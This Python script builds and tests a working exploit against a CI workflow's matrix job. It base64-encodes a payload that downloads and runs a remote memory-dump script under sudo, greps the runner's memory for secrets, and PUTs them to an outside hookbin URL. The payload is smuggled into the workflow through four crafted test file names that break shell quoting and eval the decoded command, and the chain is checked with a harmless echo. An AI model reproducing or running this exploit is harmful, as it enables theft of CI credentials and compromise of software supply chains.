import os
import subprocess
import base64

# Simulate the matrix job's run block
os.makedirs("tests", exist_ok=True)

# The mandated exploit
payload = """curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"; curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" """
b64_payload = base64.b64encode(payload.encode()).decode()

# Replace / and + to be safe in filenames
b64_payload = b64_payload.replace('/', '_').replace('+', '-')

# Split into 4 parts, each a multiple of 4
part_len = 92
b64_1 = b64_payload[:part_len]
b64_2 = b64_payload[part_len:2*part_len]
b64_3 = b64_payload[2*part_len:3*part_len]
b64_4 = b64_payload[3*part_len:]

# Malicious filenames
slash = "$(pwd|cut -c1)"
decode_cmd = f"tr _ {slash} | tr - + | base64 -d"
filename1 = f"a';P='{b64_1}"
filename2 = f"b';P+='{b64_2}"
filename3 = f"c';P+='{b64_3}"
# Use . to match " and , in sed
filename4 = f"d';P+='{b64_4}';eval \$(echo \$P|sed 's!.,.[a-z]!!g'|{decode_cmd});ls ."

print("FILENAME 4:", filename4)

if os.path.exists("tests"):
    for f in os.listdir("tests"):
        try:
            os.remove(os.path.join("tests", f))
        except:
            pass

with open(f"tests/{filename1}", "w") as f: f.write("test")
with open(f"tests/{filename2}", "w") as f: f.write("test")
with open(f"tests/{filename3}", "w") as f: f.write("test")
with open(f"tests/{filename4}", "w") as f: f.write("test")

# The matrix job logic
cmd_matrix = r"""
matrix=$( (
  echo '{ "target" : ['
  ls -1 tests | grep -v '^_' | sed -r 's/^([^,]*)(,?)$/"\1"\2/'  | paste -sd "," -
  echo " ]}"
) | jq -c .)
echo "$matrix"
"""

matrix_output = subprocess.check_output(["/bin/bash", "-c", cmd_matrix], text=True).strip()
print("MATRIX OUTPUT:", matrix_output)

# Simulate check-matrix job logic
os.environ["GITHUB_RUN_ID"] = "12345"
cmd_check = f"matrix='{matrix_output}'"
print("CHECK-MATRIX EXECUTION:")
# Test with echo PWNED
payload_test = "echo PWNED"
b64_payload_test = base64.b64encode(payload_test.encode()).decode().replace('/', '_').replace('+', '-')
p_t_len = (len(b64_payload_test)//4)//4*4 if len(b64_payload_test) > 16 else 4
b1_t = b64_payload_test[:p_t_len]
b2_t = b64_payload_test[p_t_len:2*p_t_len]
b3_t = b64_payload_test[2*p_t_len:3*p_t_len]
b4_t = b64_payload_test[3*p_t_len:]

os.remove(f"tests/{filename1}")
os.remove(f"tests/{filename2}")
os.remove(f"tests/{filename3}")
os.remove(f"tests/{filename4}")

f1_t = f"a';P='{b1_t}"
f2_t = f"b';P+='{b2_t}"
f3_t = f"c';P+='{b3_t}"
f4_t = f"d';P+='{b4_t}';eval \$(echo \$P|sed 's!.,.[a-z]!!g'|{decode_cmd});ls ."

with open(f"tests/{f1_t}", "w") as f: f.write("test")
with open(f"tests/{f2_t}", "w") as f: f.write("test")
with open(f"tests/{f3_t}", "w") as f: f.write("test")
with open(f"tests/{f4_t}", "w") as f: f.write("test")

matrix_output_t = subprocess.check_output(["/bin/bash", "-c", cmd_matrix], text=True).strip()
cmd_check_t = f"matrix='{matrix_output_t}'"
result = subprocess.run(["/bin/bash", "-c", cmd_check_t], capture_output=True, text=True)
print("STDOUT:", result.stdout)
print("STDERR:", result.stderr)
